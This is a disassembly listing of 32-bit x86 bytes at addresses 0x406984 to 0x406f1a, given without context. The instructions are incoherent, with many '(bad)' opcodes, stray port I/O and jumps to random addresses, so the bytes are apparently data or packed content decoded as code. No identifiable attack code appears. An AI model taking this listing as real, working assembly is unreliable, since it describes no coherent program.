  406984:	3b ce                	cmp    %esi,%ecx
  406986:	1b 09                	sbb    (%ecx),%ecx
  406988:	87 07                	xchg   %eax,(%edi)
  40698a:	a2 cc 1c 39 cf       	mov    %al,0xcf391ccc
  40698f:	5a                   	pop    %edx
  406990:	47                   	inc    %edi
  406991:	10 1a                	adc    %bl,(%edx)
  406993:	ee                   	out    %al,(%dx)
  406994:	03 10                	add    (%eax),%edx
  406996:	d7                   	xlat   %ds:(%ebx)
  406997:	13 7a 3f             	adc    0x3f(%edx),%edi
  40699a:	93                   	xchg   %eax,%ebx
  40699b:	79 04                	jns    0x4069a1
  40699d:	cc                   	int3
  40699e:	51                   	push   %ecx
  40699f:	b5 5c                	mov    $0x5c,%ch
  4069a1:	2c 00                	sub    $0x0,%al
  4069a3:	48                   	dec    %eax
  4069a4:	f0 6d                	lock insl (%dx),%es:(%edi)
  4069a6:	ba 0f 0b 4c 77       	mov    $0x774c0b0f,%edx
  4069ab:	28 17                	sub    %dl,(%edi)
  4069ad:	5d                   	pop    %ebp
  4069ae:	03 10                	add    (%eax),%edx
  4069b0:	20 03                	and    %al,(%ebx)
  4069b2:	e2 7f                	loop   0x406a33
  4069b4:	05 19 3c 44 dd       	add    $0xdd443c19,%eax
  4069b9:	be 12 8a 25 ba       	mov    $0xba258a12,%esi
  4069be:	69 81 50 5a 07 ac 39 	imul   $0x34414739,-0x53f8a5b0(%ecx),%eax
  4069c5:	47 41 34 
  4069c8:	76 5c                	jbe    0x406a26
  4069ca:	c5 22                	lds    (%edx),%esp
  4069cc:	c9                   	leave
  4069cd:	0b 30                	or     (%eax),%esi
  4069cf:	44                   	inc    %esp
  4069d0:	61                   	popa
  4069d1:	68 67 2c 6c 60       	push   $0x606c2c67
  4069d6:	36 94                	ss xchg %eax,%esp
  4069d8:	85 83 54 e8 b0 a2    	test   %eax,-0x5d4f17ac(%ebx)
  4069de:	52                   	push   %edx
  4069df:	b0 89                	mov    $0x89,%al
  4069e1:	14 ab                	adc    $0xab,%al
  4069e3:	81 92 39 32 34 f1 b0 	adcl   $0x7e92dbb0,-0xecbcdc7(%edx)
  4069ea:	db 92 7e 
  4069ed:	b8 d3 1d 18 d3       	mov    $0xd3181dd3,%eax
  4069f2:	a1 4f 24 61 a8       	mov    0xa861244f,%eax
  4069f7:	4b                   	dec    %ebx
  4069f8:	d9 5c 60 70          	fstps  0x70(%eax,%eiz,2)
  4069fc:	56                   	push   %esi
  4069fd:	2f                   	das
  4069fe:	34 dc                	xor    $0xdc,%al
  406a00:	3a 44 c7 dd          	cmp    -0x23(%edi,%eax,8),%al
  406a04:	0a 2e                	or     (%esi),%ch
  406a06:	60                   	pusha
  406a07:	41                   	inc    %ecx
  406a08:	c2 71 1e             	ret    $0x1e71
  406a0b:	3e 58                	ds pop %eax
  406a0d:	3f                   	aas
  406a0e:	46                   	inc    %esi
  406a0f:	34 b4                	xor    $0xb4,%al
  406a11:	fc                   	cld
  406a12:	b8 9a 14 04 45       	mov    $0x4504149a,%eax
  406a17:	5c                   	pop    %esp
  406a18:	ec                   	in     (%dx),%al
  406a19:	f9                   	stc
  406a1a:	04 0f                	add    $0xf,%al
  406a1c:	98                   	cwtl
  406a1d:	35 03 e4 cd 20       	xor    $0x20cde403,%eax
  406a22:	79 dc                	jns    0x406a00
  406a24:	e4 d4                	in     $0xd4,%al
  406a26:	24 a7                	and    $0xa7,%al
  406a28:	e5 c7                	in     $0xc7,%eax
  406a2a:	c4                   	(bad)
  406a2b:	c4 b4 b4 fc b8 19 a4 	les    -0x5be64704(%esp,%esi,4),%esi
  406a32:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  406a33:	1f                   	pop    %ds
  406a34:	37                   	aaa
  406a35:	83 e4 94             	and    $0xffffff94,%esp
  406a38:	84 66 90             	test   %ah,-0x70(%esi)
  406a3b:	9c                   	pushf
  406a3c:	96                   	xchg   %eax,%esi
  406a3d:	84 74 92 d3          	test   %dh,-0x2d(%edx,%edx,4)
  406a41:	f2 e3 64             	repnz jecxz 0x406aa8
  406a44:	64 54                	fs push %esp
  406a46:	e7 31                	out    %eax,$0x31
  406a48:	d7                   	xlat   %ds:(%ebx)
  406a49:	0c f2                	or     $0xf2,%al
  406a4b:	2b 42 23             	sub    0x23(%edx),%eax
  406a4e:	60                   	pusha
  406a4f:	36 1e                	ss push %ds
  406a51:	49                   	dec    %ecx
  406a52:	8d 72 40             	lea    0x40(%edx),%esi
  406a55:	68 04 71 89 97       	push   $0x97897104
  406a5a:	c0 96 69 09 97 09 96 	rclb   $0x96,0x9970969(%esi)
  406a61:	61                   	popa
  406a62:	89 55 25             	mov    %edx,0x25(%ebp)
  406a65:	3e f3 cb             	ds repz lret
  406a68:	94                   	xchg   %eax,%esp
  406a69:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  406a6a:	77 7d                	ja     0x406ae9
  406a6c:	2e 91                	cs xchg %eax,%ecx
  406a6e:	60                   	pusha
  406a6f:	58                   	pop    %eax
  406a70:	01 90 01 1f 72 58    	add    %edx,0x58721f01(%eax)
  406a76:	6d                   	insl   (%dx),%es:(%edi)
  406a77:	44                   	inc    %esp
  406a78:	c9                   	leave
  406a79:	4b                   	dec    %ebx
  406a7a:	27                   	daa
  406a7b:	72 6c                	jb     0x406ae9
  406a7d:	60                   	pusha
  406a7e:	7b 8c                	jnp    0x406a0c
  406a80:	7b 06                	jnp    0x406a88
  406a82:	30 83 e4 bb fc 64    	xor    %al,0x64fcbbe4(%ebx)
  406a88:	5c                   	pop    %esp
  406a89:	f2 73 35             	bnd jae 0x406ac1
  406a8c:	7f 04                	jg     0x406a92
  406a8e:	b0 b8                	mov    $0xb8,%al
  406a90:	63 0a                	arpl   %ecx,(%edx)
  406a92:	d4 c5                	aam    $0xc5
  406a94:	f7 10                	notl   (%eax)
  406a96:	e6 c4                	out    %al,$0xc4
  406a98:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  406a99:	cf                   	iret
  406a9a:	f3 3c 87             	repz cmp $0x87,%al
  406a9d:	94                   	xchg   %eax,%esp
  406a9e:	84 74 64 eb          	test   %dh,-0x15(%esp,%eiz,2)
  406aa2:	fc                   	cld
  406aa3:	69 32 54 38 e8 bc    	imul   $0xbce83854,(%edx),%esi
  406aa9:	b3 3a                	mov    $0x3a,%bl
  406aab:	50                   	push   %eax
  406aac:	1d 48 50 bc e3       	sbb    $0xe3bc5048,%eax
  406ab1:	ec                   	in     (%dx),%al
  406ab2:	ec                   	in     (%dx),%al
  406ab3:	1e                   	push   %ds
  406ab4:	48                   	dec    %eax
  406ab5:	1f                   	pop    %ds
  406ab6:	50                   	push   %eax
  406ab7:	a3 a3 b3 e3 1e       	mov    %eax,0x1ee3b3a3
  406abc:	4c                   	dec    %esp
  406abd:	4c                   	dec    %esp
  406abe:	6c                   	insb   (%dx),%es:(%edi)
  406abf:	16                   	push   %ss
  406ac0:	50                   	push   %eax
  406ac1:	2d 81 1b 04 fc       	sub    $0xfc041b81,%eax
  406ac6:	fb                   	sti
  406ac7:	fd                   	std
  406ac8:	10 f8                	adc    %bh,%al
  406aca:	06                   	push   %es
  406acb:	1c 5a                	sbb    $0x5a,%al
  406acd:	14 ca                	adc    $0xca,%al
  406acf:	e1 1b                	loope  0x406aec
  406ad1:	00 86 63 21 3d 2f    	add    %al,0x2f3d2163(%esi)
  406ad7:	1c 3c                	sbb    $0x3c,%al
  406ad9:	38 4f 3b             	cmp    %cl,0x3b(%edi)
  406adc:	ff                   	(bad)
  406add:	3e 46                	ds inc %esi
  406adf:	be 97 a1 59 ec       	mov    $0xec59a197,%esi
  406ae4:	dc fb                	fdivr  %st,%st(3)
  406ae6:	59                   	pop    %ecx
  406ae7:	17                   	pop    %ss
  406ae8:	c2 71 60             	ret    $0x6071
  406aeb:	31 72 a6             	xor    %esi,-0x5a(%edx)
  406aee:	5b                   	pop    %ebx
  406aef:	8e 42 8f             	mov    -0x71(%edx),%es
  406af2:	3a 88 00 27 76 38    	cmp    0x38762700(%eax),%cl
  406af8:	34 04                	xor    $0x4,%al
  406afa:	07                   	pop    %es
  406afb:	31 30                	xor    %esi,(%eax)
  406afd:	5b                   	pop    %ebx
  406afe:	50                   	push   %eax
  406aff:	37                   	aaa
  406b00:	62 d1 04 64 b6       	(bad)
  406b05:	82 80 59 b1 68 69 d6 	addb   $0xd6,0x6968b159(%eax)
  406b0c:	6c                   	insb   (%dx),%es:(%edi)
  406b0d:	b1 63                	mov    $0x63,%cl
  406b0f:	19 72 d8             	sbb    %esi,-0x28(%edx)
  406b12:	fb                   	sti
  406b13:	38 8f 23 7e 30 0c    	cmp    %cl,0xc307e23(%edi)
  406b19:	6c                   	insb   (%dx),%es:(%edi)
  406b1a:	2a 62 88             	sub    -0x78(%edx),%ah
  406b1d:	d4 9c                	aam    $0x9c
  406b1f:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  406b20:	58                   	pop    %eax
  406b21:	d0 31                	shlb   $1,(%ecx)
  406b23:	d4 fb                	aam    $0xfb
  406b25:	30 c4                	xor    %al,%ah
  406b27:	32 e1                	xor    %cl,%ah
  406b29:	1c ec                	sbb    $0xec,%al
  406b2b:	90                   	nop
  406b2c:	35 17 d6 84 6c       	xor    $0x6c84d617,%eax
  406b31:	1c 3a                	sbb    $0x3a,%al
  406b33:	1f                   	pop    %ds
  406b34:	39 0b                	cmp    %ecx,(%ebx)
  406b36:	ce                   	into
  406b37:	83 3e fd             	cmpl   $0xfffffffd,(%esi)
  406b3a:	c7                   	(bad)
  406b3b:	d8 00                	fadds  (%eax)
  406b3d:	46                   	inc    %esi
  406b3e:	59                   	pop    %ecx
  406b3f:	9e                   	sahf
  406b40:	08 2f                	or     %ch,(%edi)
  406b42:	63 c7                	arpl   %eax,%edi
  406b44:	48                   	dec    %eax
  406b45:	ea ac fa 74 8c 14 a7 	ljmp   $0xa714,$0x8c74faac
  406b4c:	63 c4                	arpl   %eax,%esp
  406b4e:	39 75 21             	cmp    %esi,0x21(%ebp)
  406b51:	9c                   	pushf
  406b52:	bf 13 ed 48 7d       	mov    $0x7d48ed13,%edi
  406b57:	99                   	cltd
  406b58:	c4 76 05             	les    0x5(%esi),%esi
  406b5b:	4c                   	dec    %esp
  406b5c:	35 05 cb d0 04       	xor    $0x4d0cb05,%eax
  406b61:	7c fe                	jl     0x406b61
  406b63:	d1 ec                	shr    $1,%esp
  406b65:	69 78 58 76 4e e4 ff 	imul   $0xffe44e76,0x58(%eax),%edi
  406b6c:	58                   	pop    %eax
  406b6d:	f4                   	hlt
  406b6e:	8e 16                	mov    (%esi),%ss
  406b70:	ff 6f 47             	ljmp   *0x47(%edi)
  406b73:	5c                   	pop    %esp
  406b74:	1f                   	pop    %ds
  406b75:	e9 2e 93 71 34       	jmp    0x34b1fea8
  406b7a:	96                   	xchg   %eax,%esi
  406b7b:	e9 c7 a2 30 7a       	jmp    0x7a710e47
  406b80:	3d f7 44 6f 5f       	cmp    $0x5f6f44f7,%eax
  406b85:	d2 8f 44 0e cb 79    	rorb   %cl,0x79cb0e44(%edi)
  406b8b:	32 fc                	xor    %ah,%bh
  406b8d:	d8 64 be 93          	fsubs  -0x6d(%esi,%edi,4)
  406b91:	79 d4                	jns    0x406b67
  406b93:	ec                   	in     (%dx),%al
  406b94:	dc 5a 05             	fcompl 0x5(%edx)
  406b97:	79 f3                	jns    0x406b8c
  406b99:	1a 29                	sbb    (%ecx),%ch
  406b9b:	96                   	xchg   %eax,%esi
  406b9c:	26 43                	es inc %ebx
  406b9e:	f0 50                	lock push %eax
  406ba0:	64 1e                	fs push %ds
  406ba2:	72 26                	jb     0x406bca
  406ba4:	f1                   	int1
  406ba5:	00 f6                	add    %dh,%dh
  406ba7:	ae                   	scas   %es:(%edi),%al
  406ba8:	3c 91                	cmp    $0x91,%al
  406baa:	ca 21 bb             	lret   $0xbb21
  406bad:	0c 42                	or     $0x42,%al
  406baf:	e4 0e                	in     $0xe,%al
  406bb1:	01 79 95             	add    %edi,-0x6b(%ecx)
  406bb4:	80 47 14 72          	addb   $0x72,0x14(%edi)
  406bb8:	96                   	xchg   %eax,%esi
  406bb9:	01 62 54             	add    %esp,0x54(%edx)
  406bbc:	dc 59 e0             	fcompl -0x20(%ecx)
  406bbf:	c2 35 18             	ret    $0x1835
  406bc2:	0f dd 71 67          	paddusw 0x67(%ecx),%mm6
  406bc6:	77 01                	ja     0x406bc9
  406bc8:	10 02                	adc    %al,(%edx)
  406bca:	77 76                	ja     0x406c42
  406bcc:	c7                   	(bad)
  406bcd:	9d                   	popf
  406bce:	11 03                	adc    %eax,(%ebx)
  406bd0:	12 77 dc             	adc    -0x24(%edi),%dh
  406bd3:	d9 1d 04 13 05 9d    	fstps  0x9d051304
  406bd9:	dd 71 67             	fnsave 0x67(%ecx)
  406bdc:	14 06                	adc    $0x6,%al
  406bde:	15 1f 77 76 c7       	adc    $0xc776771f,%eax
  406be3:	07                   	pop    %es
  406be4:	16                   	push   %ss
  406be5:	08 59 19             	or     %bl,0x19(%ecx)
  406be8:	cd c2                	int    $0xc2
  406bea:	15 f4 4a 47 d5       	adc    $0xd5474af4,%eax
  406bef:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  406bf0:	b4 cb                	mov    $0xcb,%ah
  406bf2:	69 1a 58 63 10 ff    	imul   $0xff106358,(%edx),%ebx
  406bf8:	e2 6b                	loop   0x406c65
  406bfa:	4a                   	dec    %edx
  406bfb:	72 5a                	jb     0x406c57
  406bfd:	48                   	dec    %eax
  406bfe:	e7 40                	out    %eax,$0x40
  406c00:	0b ec                	or     %esp,%ebp
  406c02:	bd 7c 05 01 7d       	mov    $0x7d01057c,%ebp
  406c07:	92                   	xchg   %eax,%edx
  406c08:	81 68 2f 09 c8 62 1c 	subl   $0x1c62c809,0x2f(%eax)
  406c0f:	d6                   	salc
  406c10:	27                   	daa
  406c11:	28 35 2c ab 5a 27    	sub    %dh,0x275aab2c
  406c17:	18 a4 39 c6 16 03 70 	sbb    %ah,0x700316c6(%ecx,%edi,1)
  406c1e:	5c                   	pop    %esp
  406c1f:	f0 9e                	lock sahf
  406c21:	fd                   	std
  406c22:	6a f0                	push   $0xfffffff0
  406c24:	fe                   	(bad)
  406c25:	fe                   	(bad)
  406c26:	68 c0 2e c0 d4       	push   $0xd4c02ec0
  406c2b:	5c                   	pop    %esp
  406c2c:	fe                   	(bad)
  406c2d:	16                   	push   %ss
  406c2e:	f3 8a 70 10          	repz mov 0x10(%eax),%dh
  406c32:	64 3e 9b             	fs ds fwait
  406c35:	70 2f                	jo     0x406c66
  406c37:	39 bc fe c6 0e 6a 2a 	cmp    %edi,0x2a6a0ec6(%esi,%edi,8)
  406c3e:	7c 0d                	jl     0x406c4d
  406c40:	91                   	xchg   %eax,%ecx
  406c41:	e7 00                	out    %eax,$0x0
  406c43:	67 8e f5             	addr16 mov %ebp,%?
  406c46:	aa                   	stos   %al,%es:(%edi)
  406c47:	0a 04 61             	or     (%ecx,%eiz,2),%al
  406c4a:	73 d9                	jae    0x406c25
  406c4c:	64 5f                	fs pop %edi
  406c4e:	01 10                	add    %edx,(%eax)
  406c50:	79 ef                	jns    0x406c41
  406c52:	10 c0                	adc    %al,%al
  406c54:	5d                   	pop    %ebp
  406c55:	6b 30 8d             	imul   $0xffffff8d,(%eax),%esi
  406c58:	01 78 b1             	add    %edi,-0x4f(%eax)
  406c5b:	f9                   	stc
  406c5c:	1a 94 e7 4c 01 2e 52 	sbb    0x522e014c(%edi,%eiz,8),%dl
  406c63:	cf                   	iret
  406c64:	a0 44 fb 56 f9       	mov    0xf956fb44,%al
  406c69:	4c                   	dec    %esp
  406c6a:	ef                   	out    %eax,(%dx)
  406c6b:	e8 ef 05 09 c6       	call   0xc649725f
  406c70:	1f                   	pop    %ds
  406c71:	23 2a                	and    (%edx),%ebp
  406c73:	6c                   	insb   (%dx),%es:(%edi)
  406c74:	14 a7                	adc    $0xa7,%al
  406c76:	30 9f 43 bb 29 cc    	xor    %bl,-0x33d644bd(%edi)
  406c7c:	fb                   	sti
  406c7d:	af                   	scas   %es:(%edi),%eax
  406c7e:	ac                   	lods   %ds:(%esi),%al
  406c7f:	b2 45                	mov    $0x45,%dl
  406c81:	d2 58 64             	rcrb   %cl,0x64(%eax)
  406c84:	ce                   	into
  406c85:	6f                   	outsl  %ds:(%esi),(%dx)
  406c86:	c8 70 fc 0d          	enter  $0xfc70,$0xd
  406c8a:	99                   	cltd
  406c8b:	fa                   	cli
  406c8c:	50                   	push   %eax
  406c8d:	55                   	push   %ebp
  406c8e:	1c 75                	sbb    $0x75,%al
  406c90:	70 50                	jo     0x406ce2
  406c92:	40                   	inc    %eax
  406c93:	ff 72 30             	push   0x30(%edx)
  406c96:	20 7f 4b             	and    %bh,0x4b(%edi)
  406c99:	76 0e                	jbe    0x406ca9
  406c9b:	10 3f                	adc    %bh,(%edi)
  406c9d:	4f                   	dec    %edi
  406c9e:	1a a2 14 b0 93 39    	sbb    0x3993b014(%edx),%ah
  406ca4:	64 e8 a6 1a 32 46    	fs call 0x46728750
  406caa:	a0 78 0a 05 21       	mov    0x21050a78,%al
  406caf:	20 97 3a d8 fe 3e    	and    %dl,0x3efed83a(%edi)
  406cb5:	15 65 4c 73 c8       	adc    $0xc8734c65,%eax
  406cba:	47                   	inc    %edi
  406cbb:	33 63 c2             	xor    -0x3e(%ebx),%esp
  406cbe:	b8 fe a8 da 70       	mov    $0x70daa8fe,%eax
  406cc3:	21 c8                	and    %ecx,%eax
  406cc5:	27                   	daa
  406cc6:	98                   	cwtl
  406cc7:	fe 04 fd 1a 0b 36 0c 	incb   0xc360b1a(,%edi,8)
  406cce:	18 f2                	sbb    %dh,%dl
  406cd0:	6a 8d                	push   $0xffffff8d
  406cd2:	30 95 f2 54 2c c3    	xor    %dl,-0x3cd3ab0e(%ebp)
  406cd8:	c4 70 53             	les    0x53(%eax),%esi
  406cdb:	06                   	push   %es
  406cdc:	23 38                	and    (%eax),%edi
  406cde:	eb 2f                	jmp    0x406d0f
  406ce0:	0c fe                	or     $0xfe,%al
  406ce2:	a3 bb 9f 74 63       	mov    %eax,0x63749fbb
  406ce7:	f5                   	cmc
  406ce8:	51                   	push   %ecx
  406ce9:	87 21                	xchg   %esp,(%ecx)
  406ceb:	55                   	push   %ebp
  406cec:	5e                   	pop    %esi
  406ced:	86 01                	xchg   %al,(%ecx)
  406cef:	8c 54 86 fc          	mov    %ss,-0x4(%esi,%eax,4)
  406cf3:	1e                   	push   %ds
  406cf4:	56                   	push   %esi
  406cf5:	75 7e                	jne    0x406d75
  406cf7:	c7                   	(bad)
  406cf8:	0d 50 75 04 66       	or     $0x66047550,%eax
  406cfd:	8a 64 40 36          	mov    0x36(%eax,%eax,2),%ah
  406d01:	06                   	push   %es
  406d02:	ba 73 e2 ed 1c       	mov    $0x1cede273,%edx
  406d07:	ee                   	out    %al,(%dx)
  406d08:	ad                   	lods   %ds:(%esi),%eax
  406d09:	d9 8f 42 40 9a 7e    	(bad) 0x7e9a4042(%edi)
  406d0f:	14 22                	adc    $0x22,%al
  406d11:	77 1f                	ja     0x406d32
  406d13:	ed                   	in     (%dx),%eax
  406d14:	9f                   	lahf
  406d15:	7d a3                	jge    0x406cba
  406d17:	28 73 d3             	sub    %dh,-0x2d(%ebx)
  406d1a:	d0 18                	rcrb   $1,(%eax)
  406d1c:	96                   	xchg   %eax,%esi
  406d1d:	e4 02                	in     $0x2,%al
  406d1f:	ef                   	out    %eax,(%dx)
  406d20:	5e                   	pop    %esi
  406d21:	91                   	xchg   %eax,%ecx
  406d22:	d6                   	salc
  406d23:	50                   	push   %eax
  406d24:	7a 96                	jp     0x406cbc
  406d26:	2a 70 31             	sub    0x31(%eax),%dh
  406d29:	54                   	push   %esp
  406d2a:	9b                   	fwait
  406d2b:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  406d2c:	29 b7 29 e8 50 79    	sub    %esi,0x7950e829(%edi)
  406d32:	a1 78 5e 10 78       	mov    0x78105e78,%eax
  406d37:	5e                   	pop    %esi
  406d38:	d1 b8 c8 98 65 f1    	sarl   $1,-0xe9a6738(%eax)
  406d3e:	f6 85 09 1b 48 42 78 	testb  $0x78,0x42481b09(%ebp)
  406d45:	04 fd                	add    $0xfd,%al
  406d47:	c1 19 5e             	rcrl   $0x5e,(%ecx)
  406d4a:	02 76 52             	add    0x52(%esi),%dh
  406d4d:	73 37                	jae    0x406d86
  406d4f:	f1                   	int1
  406d50:	8a 20                	mov    (%eax),%ah
  406d52:	b7 8f                	mov    $0x8f,%bh
  406d54:	3a b1 45 3c 04 80    	cmp    -0x7ffbc3bb(%ecx),%dh
  406d5a:	41                   	inc    %ecx
  406d5b:	d4 c3                	aam    $0xc3
  406d5d:	ce                   	into
  406d5e:	05 14 0b 06 06       	add    $0x6060b14,%eax
  406d63:	01 c3                	add    %eax,%ebx
  406d65:	b8 fd 86 bc 1f       	mov    $0x1fbc86fd,%eax
  406d6a:	04 8c                	add    $0x8c,%al
  406d6c:	d3 07                	roll   %cl,(%edi)
  406d6e:	e7 05                	out    %eax,$0x5
  406d70:	de 7f 50             	fidivrs 0x50(%edi)
  406d73:	d1 e7                	shl    $1,%edi
  406d75:	85 61 22             	test   %esp,0x22(%ecx)
  406d78:	28 58 2f             	sub    %bl,0x2f(%eax)
  406d7b:	68 d4 50 ce 0a       	push   $0xace50d4
  406d80:	17                   	pop    %ss
  406d81:	37                   	aaa
  406d82:	58                   	pop    %eax
  406d83:	01 f3                	add    %esi,%ebx
  406d85:	3b eb                	cmp    %ebx,%ebp
  406d87:	fc                   	cld
  406d88:	5c                   	pop    %esp
  406d89:	02 60 ec             	add    -0x14(%eax),%ah
  406d8c:	9e                   	sahf
  406d8d:	d0 b0 0c 1b 0b b8    	shlb   $1,-0x47f4e4f4(%eax)
  406d93:	c6                   	(bad)
  406d94:	0d 5b e1 07 0a       	or     $0xa07e15b,%eax
  406d99:	b1 69                	mov    $0x69,%cl
  406d9b:	88 1d 0d 10 28 10    	mov    %bl,0x1028100d
  406da1:	34 a3                	xor    $0xa3,%al
  406da3:	e3 63                	jecxz  0x406e08
  406da5:	63 3c 10             	arpl   %edi,(%eax,%edx,1)
  406da8:	0d 36 a1 22 7a       	or     $0x7a22a136,%eax
  406dad:	0f ac 2d a6 b3 0c 25 	shrd   $0xe8,%ebp,0x250cb3a6
  406db4:	e8 
  406db5:	d8 58 08             	fcomps 0x8(%eax)
  406db8:	54                   	push   %esp
  406db9:	13 04 46             	adc    (%esi,%eax,2),%eax
  406dbc:	e4 38                	in     $0x38,%al
  406dbe:	8b 4b 13             	mov    0x13(%ebx),%ecx
  406dc1:	91                   	xchg   %eax,%ecx
  406dc2:	c6                   	(bad)
  406dc3:	8a 83 09 e4 71 32    	mov    0x3271e409(%ebx),%al
  406dc9:	10 11                	adc    %dl,(%ecx)
  406dcb:	40                   	inc    %eax
  406dcc:	99                   	cltd
  406dcd:	a0 e8 65 40 92       	mov    0x924065e8,%al
  406dd2:	5a                   	pop    %edx
  406dd3:	3f                   	aas
  406dd4:	ab                   	stos   %eax,%es:(%edi)
  406dd5:	68 32 4d 88 f0       	push   $0xf0884d32
  406dda:	ff 27                	jmp    *(%edi)
  406ddc:	68 54 27 a2 95       	push   $0x95a22754
  406de1:	01 25 ba 8b 3a 1c    	add    %esp,0x1c3a8bba
  406de7:	39 c4                	cmp    %eax,%esp
  406de9:	1c cf                	sbb    $0xcf,%al
  406deb:	12 e1                	adc    %cl,%ah
  406ded:	13 af 10 60 16 26    	adc    0x26166010(%edi),%ebp
  406df3:	64 1b de             	fs sbb %esi,%ebx
  406df6:	21 03                	and    %eax,(%ebx)
  406df8:	19 63 86             	sbb    %esp,-0x7a(%ebx)
  406dfb:	b0 b0                	mov    $0xb0,%al
  406dfd:	08 0d 56 dd c2 09    	or     %cl,0x9c2dd56
  406e03:	18 74 a4 db          	sbb    %dh,-0x25(%esp,%eiz,4)
  406e07:	3f                   	aas
  406e08:	fc                   	cld
  406e09:	02 19                	add    (%ecx),%bl
  406e0b:	ec                   	in     (%dx),%al
  406e0c:	e3 b5                	jecxz  0x406dc3
  406e0e:	bf 1d b8 4e bd       	mov    $0xbd4eb81d,%edi
  406e13:	ac                   	lods   %ds:(%esi),%al
  406e14:	52                   	push   %edx
  406e15:	70 02                	jo     0x406e19
  406e17:	0a 1a                	or     (%edx),%bl
  406e19:	00 25 14 b0 b1 54    	add    %ah,0x54b1b014
  406e1f:	02 3f                	add    (%edi),%bh
  406e21:	32 bb de 40 b4 7f    	xor    0x7fb440de(%ebx),%bh
  406e27:	af                   	scas   %es:(%edi),%eax
  406e28:	f2 fc                	repnz cld
  406e2a:	ce                   	into
  406e2b:	eb 5a                	jmp    0x406e87
  406e2d:	58                   	pop    %eax
  406e2e:	72 ea                	jb     0x406e1a
  406e30:	5a                   	pop    %edx
  406e31:	ca ea 70             	lret   $0x70ea
  406e34:	c6 c4 b1             	mov    $0xb1,%ah
  406e37:	50                   	push   %eax
  406e38:	10 38                	adc    %bh,(%eax)
  406e3a:	ff 27                	jmp    *(%edi)
  406e3c:	d9 10                	fsts   (%eax)
  406e3e:	0c fc                	or     $0xfc,%al
  406e40:	63 69 5a             	arpl   %ebp,0x5a(%ecx)
  406e43:	90                   	nop
  406e44:	2d 19 1c 37 3a       	sub    $0x3a371c19,%eax
  406e49:	dc fe                	fdivr  %st,%st(6)
  406e4b:	8e 7c 11 e5          	mov    -0x1b(%ecx,%edx,1),%?
  406e4f:	cc                   	int3
  406e50:	bc f1 2f 9f c7       	mov    $0xc79f2ff1,%esp
  406e55:	70 ac                	jo     0x406e03
  406e57:	9c                   	pushf
  406e58:	10 b4 60 ca 17 79 c1 	adc    %dh,-0x3e86e836(%eax,%eiz,2)
  406e5f:	29 5a 06             	sub    %ebx,0x6(%edx)
  406e62:	8c 71 42             	mov    %?,0x42(%ecx)
  406e65:	1c 4d                	sbb    $0x4d,%al
  406e67:	37                   	aaa
  406e68:	ec                   	in     (%dx),%al
  406e69:	07                   	pop    %es
  406e6a:	60                   	pusha
  406e6b:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  406e6c:	64 d1 b4 74 aa 91 41 	shll   $1,%fs:0x4d4191aa(%esp,%esi,2)
  406e73:	4d 
  406e74:	15 db 54 6a 05       	adc    $0x56a54db,%eax
  406e79:	f3 32 94 b9 40 63 2f 	repz xor -0x7cd09cc0(%ecx,%edi,4),%dl
  406e80:	83 
  406e81:	64 60                	fs pusha
  406e83:	2f                   	das
  406e84:	1c 48                	sbb    $0x48,%al
  406e86:	19 1b                	sbb    %ebx,(%ebx)
  406e88:	dc d8                	(bad)
  406e8a:	55                   	push   %ebp
  406e8b:	0d c3 0b dd 8a       	or     $0x8add0bc3,%eax
  406e90:	b0 fb                	mov    $0xfb,%al
  406e92:	dd 2c 5a             	(bad) (%edx,%ebx,2)
  406e95:	3f                   	aas
  406e96:	0b 3e                	or     (%esi),%edi
  406e98:	4c                   	dec    %esp
  406e99:	d0 35 80 74 94 fe    	shlb   $1,0xfe947480
  406e9f:	c8 9b a4 7e          	enter  $0xa49b,$0x7e
  406ea3:	8a 62 3d             	mov    0x3d(%edx),%ah
  406ea6:	7e 4c                	jle    0x406ef4
  406ea8:	34 0a                	xor    $0xa,%al
  406eaa:	69 b1 42 8f 59 8e ee 	imul   $0x20563ee,-0x71a670be(%ecx),%esi
  406eb1:	63 05 02 
  406eb4:	74 1d                	je     0x406ed3
  406eb6:	ab                   	stos   %eax,%es:(%edi)
  406eb7:	8f                   	(bad)
  406eb8:	af                   	scas   %es:(%edi),%eax
  406eb9:	de 95 02 3a 8f fd    	ficoms -0x270c5fe(%ebp)
  406ebf:	f9                   	stc
  406ec0:	df 90 02 72 77 cc    	fists  -0x33888dfe(%eax)
  406ec6:	60                   	pusha
  406ec7:	f7 a8 35 d7 e7 df    	imull  -0x201828cb(%eax)
  406ecd:	23 e1                	and    %ecx,%esp
  406ecf:	d3 20                	shll   %cl,(%eax)
  406ed1:	7e e8                	jle    0x406ebb
  406ed3:	00 9c 4a 79 7e 2d 74 	add    %bl,0x742d7e79(%edx,%ecx,2)
  406eda:	0c bd                	or     $0xbd,%al
  406edc:	4a                   	dec    %edx
  406edd:	f1                   	int1
  406ede:	bc 10 dc b4 60       	mov    $0x60b4dc10,%esp
  406ee3:	fc                   	cld
  406ee4:	14 b4                	adc    $0xb4,%al
  406ee6:	d1 73 58             	shll   $1,0x58(%ebx)
  406ee9:	cc                   	int3
  406eea:	ac                   	lods   %ds:(%esi),%al
  406eeb:	23 d5                	and    %ebp,%edx
  406eed:	3b 68 f2             	cmp    -0xe(%eax),%ebp
  406ef0:	6d                   	insl   (%dx),%es:(%edi)
  406ef1:	30 dc                	xor    %bl,%ah
  406ef3:	04 58                	add    $0x58,%al
  406ef5:	58                   	pop    %eax
  406ef6:	4a                   	dec    %edx
  406ef7:	c8 df 21 58          	enter  $0x21df,$0x58
  406efb:	45                   	inc    %ebp
  406efc:	cd c5                	int    $0xc5
  406efe:	ec                   	in     (%dx),%al
  406eff:	58                   	pop    %eax
  406f00:	54                   	push   %esp
  406f01:	e9 ec 4c 4b a4       	jmp    0xa48bbbf2
  406f06:	47                   	inc    %edi
  406f07:	30 81 b5 95 08 89    	xor    %al,-0x76f76a4b(%ecx)
  406f0d:	01 2a                	add    %ebp,(%edx)
  406f0f:	e0 23                	loopne 0x406f34
  406f11:	1e                   	push   %ds
  406f12:	6d                   	insl   (%dx),%es:(%edi)
  406f13:	58                   	pop    %eax
  406f14:	60                   	pusha
  406f15:	2a 4b 17             	sub    0x17(%ebx),%cl
  406f18:	76 58                	jbe    0x406f72
  406f1a:	60                   	pusha
